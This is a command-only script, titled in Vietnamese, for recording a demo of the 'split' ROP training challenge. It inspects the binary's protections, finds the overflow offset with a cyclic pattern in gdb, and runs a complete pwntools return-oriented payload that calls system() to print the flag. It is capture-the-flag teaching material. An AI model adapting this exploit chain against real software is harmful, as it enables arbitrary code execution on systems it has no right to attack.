# Lệnh quay demo `split` — chỉ lệnh

## 0
```bash
cd ~/s05_split
ls -l split flag.txt exploit.py
```

## 1
```bash
file split
ls -l flag.txt
```

## 2
```bash
checksec --file=split
cat /proc/sys/kernel/randomize_va_space
```

## 3
```bash
echo "hello" | ./split
python3 -c "print('A'*100)" | ./split; echo "exit=$?"
```

## 4
```bash
objdump -d split | grep -A1 "<system@plt>:" | head
ROPgadget --binary split | grep "pop rdi ; ret"
ROPgadget --binary split --string "/bin/cat flag.txt"
```

## 5
```bash
cyclic 200 > pattern.txt
head -c 60 pattern.txt; echo
gdb -q ./split
```
```gdb
run < pattern.txt
info registers rip
quit
```
```bash
cyclic -l kaaa
```

## 6
```bash
batcat --paging=never exploit.py 2>/dev/null || cat -n exploit.py
python3 exploit.py
```
```bash
for i in 1 2; do echo "===== RUN $i ====="; python3 -c "
from pwn import *
context.log_level='warn'
elf=context.binary=ELF('./split'); rop=ROP(elf)
payload=b'A'*40+p64(rop.find_gadget(['ret'])[0])+p64(rop.find_gadget(['pop rdi','ret'])[0])+p64(elf.symbols['usefulString'])+p64(elf.plt['system'])
p=process('./split'); p.sendline(payload); print(p.recvall(timeout=3).decode(errors='replace'))
"; done | tee run_log.txt
grep -c "ROPE{" run_log.txt
```

## 7
```bash
python3 -c "
from pwn import *
context.arch='amd64'; elf=ELF('./split'); rop=ROP(elf)
payload=b'A'*40+p64(rop.find_gadget(['ret'])[0])+p64(rop.find_gadget(['pop rdi','ret'])[0])+p64(elf.symbols['usefulString'])+p64(elf.plt['system'])
open('payload.bin','wb').write(payload)"
gdb -q -batch -ex "break system" -ex "run < payload.bin" -ex 'x/s $rdi' -ex 'info registers rdi rsp rip' ./split
```
